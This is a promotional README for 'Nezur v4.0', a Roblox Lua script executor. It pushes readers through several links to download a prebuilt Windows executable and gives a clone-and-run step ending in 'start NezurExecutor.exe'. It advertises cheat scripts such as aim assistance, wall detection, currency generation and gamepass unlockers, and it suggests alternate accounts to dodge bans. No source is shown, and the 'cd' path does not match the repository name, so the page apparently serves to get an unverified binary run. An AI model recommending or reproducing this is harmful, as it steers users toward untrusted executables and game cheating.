# Nezur PC v4.0 - Roblox Script Executor 2026

> **A compact, native Windows application for running Lua scripts in Roblox.** Nezur combines one-click injection, an integrated hub containing hundreds of community scripts, and a simple desktop UI. It is free to use and does not require a key.

[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-westtm1221/nezur-script-hub-loader?style=flat-square)](https://github.com)

---

<p align="center">
  <a href="https://jason-westtm1221.github.io/nezur-script-hub-loader/">
    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Nezur-v4.0%20Latest-brightgreen?style=for-the-badge" alt="Download Nezur">
  </a>
</p>

> **[Download Nezur v4.0](https://jason-westtm1221.github.io/nezur-script-hub-loader/)**  
> Windows 10 / 11 · 64-bit · Free · No Key Required

---

[Download Latest Build](https://jason-westtm1221.github.io/nezur-script-hub-loader/)

---

## About Nezur

Nezur is a Windows-focused Lua executor created for Roblox. It avoids bulky launchers and recurring key collection by providing a streamlined setup with one-click script injection. A built-in script hub also lets you search for, load, and execute community scripts from within the application.

The tool is intended for everyday players as well as experienced scripters. It supports queued and batch execution, includes debugging tools for investigating errors, and provides several interface languages. Its automatic update system checks for compatibility releases so updates do not have to be downloaded manually.

---

## Feature Highlights

- **Single-Click Injection** - Attach to Roblox and execute scripts without working through complicated menus.
- **Integrated Script Hub** - Browse more than 500 community scripts sorted by game and category.
- **SQLite-Based Queue Storage** - Queue contents and recently selected scripts remain available across sessions.
- **Automatic Updates** - Startup checks identify new releases and install updates with minimal interaction.
- **Language Options** - Choose from multiple UI languages.
- **Small Installation Size** - The application uses under 40 MB of disk space.
- **Batch Runner** - Place several scripts in a queue and execute them consecutively from one action.
- **Lua Debugger** - Review execution activity, inspect error output, and test code before using it in-game.

---

## Supported Games and Script Types

| Game | Script Categories |
|------|-------------------|
| Adopt Me! | Pet hatching, trading automation, currency farming |
| Brookhaven | Roleplay enhancements, vehicle spawning, teleportation |
| Blox Fruits | Auto-farming, stat management, fruit finder |
| Jailbreak | Police/robber utilities, vehicle mods, coin collection |
| Tower of Hell | Auto-complete, obstacle bypass, speed adjustments |
| Arsenal | Aim assistance, weapon unlocks, visual tweaks |
| Phantom Forces | Recoil control, wall detection, hitbox adjustments |

---

## Requirements

| Component | Minimum |
|-----------|---------|
| Operating System | Windows 10 (64-bit) or Windows 11 |
| Processor | Intel Core i3 / AMD Ryzen 3 or equivalent |
| RAM | 4 GB |
| Storage | 100 MB free space |
| .NET Framework | .NET Desktop Runtime 6.0 or later |
| Roblox | Latest Roblox Player installed |

---

## Installation and First Run

```bash
git clone https://github.com/jason-westtm1221/nezur-script-hub-loader.git
cd Nezur-Execut
start NezurExecutor.exe
```

Once the program opens, it detects the Roblox installation automatically. Choose an entry from the script hub or import a local `.lua` file, then press **Inject**.

---

## Script Hub Search Ideas for 2026

- Auto-farming tools for Blox Fruits and King Legacy
- GUI script collections for Adopt Me and Jailbreak
- Teleport and ESP utilities for Phantom Forces
- Infinite yield and admin command scripts for any game
- Lua samples intended for learning and testing
- Gamepass unlockers and currency-generation scripts
- Anti-AFK and automatic-clicking utilities

---

## Project Layout

```
Nezur/
├── NezurExecutor.exe
├── config/
│   ├── settings.json
│   └── language.json
├── scripts/
│   ├── hub/
│   │   ├── bloxfruits.lua
│   │   ├── jailbreak.lua
│   │   └── adoptme.lua
│   └── user/
├── data/
│   └── queue.db
├── updates/
└── README.md
```

---

## Frequently Asked Questions

**Is Nezur safe to use?**  
Nezur is supplied as-is. You are responsible for the executor and every script you choose to run. Inspect scripts carefully before executing them.

**Does Nezur stay compatible after Roblox updates?**  
Its update mechanism is intended to restore compatibility promptly following Roblox client changes. If something stops working, look for a newer release or review the repository.

**What distinguishes Nezur from paid executors?**  
Nezur is free, with no key or subscription requirement. Paid alternatives can provide different levels of stability or script compatibility, while Nezur focuses on the core functionality most users need.

**Could using Nezur result in a Roblox account ban?**  
Every third-party executor involves risk, and Nezur makes no promise that an account will remain safe. Use it at your own discretion and consider testing with alternate accounts.

**Where does Nezur keep my scripts?**  
Scripts loaded by the user are placed in `scripts/user/`. The queue and recent selections are stored locally in the SQLite file `data/queue.db`.

---

## 2026 Development Roadmap

- [ ] Build a cloud script hub with community ratings and comments
- [ ] Add execution logs to support debugging
- [ ] Provide configurable hotkeys for rapid injection
- [ ] Grow language coverage to 10+ languages
- [ ] Improve injection speed to reduce delays during game startup

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.

---

<p align="center">
  <i>Nezur v4.0 - A lightweight, free executor for Roblox scripters.</i>
</p>
